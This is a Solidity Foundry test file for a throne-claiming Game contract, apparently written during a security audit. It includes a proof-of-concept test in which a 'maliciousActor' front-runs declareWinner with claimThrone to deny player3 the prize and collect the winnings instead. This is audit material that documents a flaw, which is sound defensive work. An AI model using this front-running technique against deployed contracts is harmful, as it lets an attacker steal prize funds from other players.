// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Game} from "../src/Game.sol";

contract GameTest is Test {
    Game public game;

    address public deployer;
    address public player1;
    address public player2;
    address public player3;
    address public maliciousActor;

    // Initial game parameters for testing
    uint256 public constant INITIAL_CLAIM_FEE = 0.1 ether; // 0.1 ETH
    uint256 public constant GRACE_PERIOD = 1 days; // 1 day in seconds
    uint256 public constant FEE_INCREASE_PERCENTAGE = 10; // 10%
    uint256 public constant PLATFORM_FEE_PERCENTAGE = 5; // 5%

    function setUp() public {
        deployer = makeAddr("deployer");
        player1 = makeAddr("player1");
        player2 = makeAddr("player2");
        player3 = makeAddr("player3");
        maliciousActor = makeAddr("maliciousActor");

        vm.deal(deployer, 10 ether);
        vm.deal(player1, 10 ether);
        vm.deal(player2, 10 ether);
        vm.deal(player3, 10 ether);
        vm.deal(maliciousActor, 10 ether);

        vm.startPrank(deployer);
        game = new Game( 
            INITIAL_CLAIM_FEE,
            GRACE_PERIOD,
            FEE_INCREASE_PERCENTAGE,
            PLATFORM_FEE_PERCENTAGE
        );
        vm.stopPrank();
    }

    function testConstructor_RevertInvalidGracePeriod() public {
        vm.expectRevert("Game: Grace period must be greater than zero.");
        new Game(INITIAL_CLAIM_FEE, 0, FEE_INCREASE_PERCENTAGE, PLATFORM_FEE_PERCENTAGE);
    }
    //@audit-poc
    function test_claim_throne() external {
        uint256 amountNeededToClainThrone = game.claimFee();
        uint256 player1Balance = player1.balance;
        assertGt(player1Balance, amountNeededToClainThrone);
        vm.startPrank(player1);
        vm.expectRevert("Game: You are already the king. No need to re-claim.");
        game.claimThrone{value: INITIAL_CLAIM_FEE}();
        vm.stopPrank();
    }

    //@audit-poc
    function test_FrontRun_declareWinner_To_Cause_Grief() external {
        vm.prank(player1);
        game.claimThrone{value: INITIAL_CLAIM_FEE}();

        uint256 claimFee = game.claimFee();
        vm.prank(player2);
        game.claimThrone{value: claimFee}();

        claimFee = game.claimFee();
        vm.prank(player3);
        game.claimThrone{value: claimFee}();

        address currentKing = game.currentKing();
        assertEq(currentKing, player3);

        uint256 newTime = block.timestamp + game.getRemainingTime();

        vm.warp(newTime + 1);

        //declare winner
        // game.declareWinner();
        // uint256 winnerPendings = game.pendingWinnings(player3);
        // assertGt(winnerPendings, 0); //3.144e17

        //attacker supersedes this above transaction with claimThrone
        claimFee = game.claimFee();
        vm.prank(maliciousActor);
        game.claimThrone{value: claimFee}();
        currentKing = game.currentKing();
        assertEq(currentKing, maliciousActor);
        
        vm.expectRevert("Game: Grace period has not expired yet.");
        game.declareWinner();
        uint256 winnerPendings = game.pendingWinnings(player3);
        assertEq(winnerPendings, 0);

        //attacker is required for grace period to pass meanwhile there is a chance for others to claim throne, hence causing more delays
        
        newTime = block.timestamp + game.getRemainingTime();
        vm.warp(newTime + 1);

        //If no one claims the throne in between then attacker becomes the kind
        game.declareWinner();
        winnerPendings = game.pendingWinnings(maliciousActor);
        assertGt(winnerPendings, 0); //4.408e17
        assertEq(currentKing, maliciousActor);
    }



}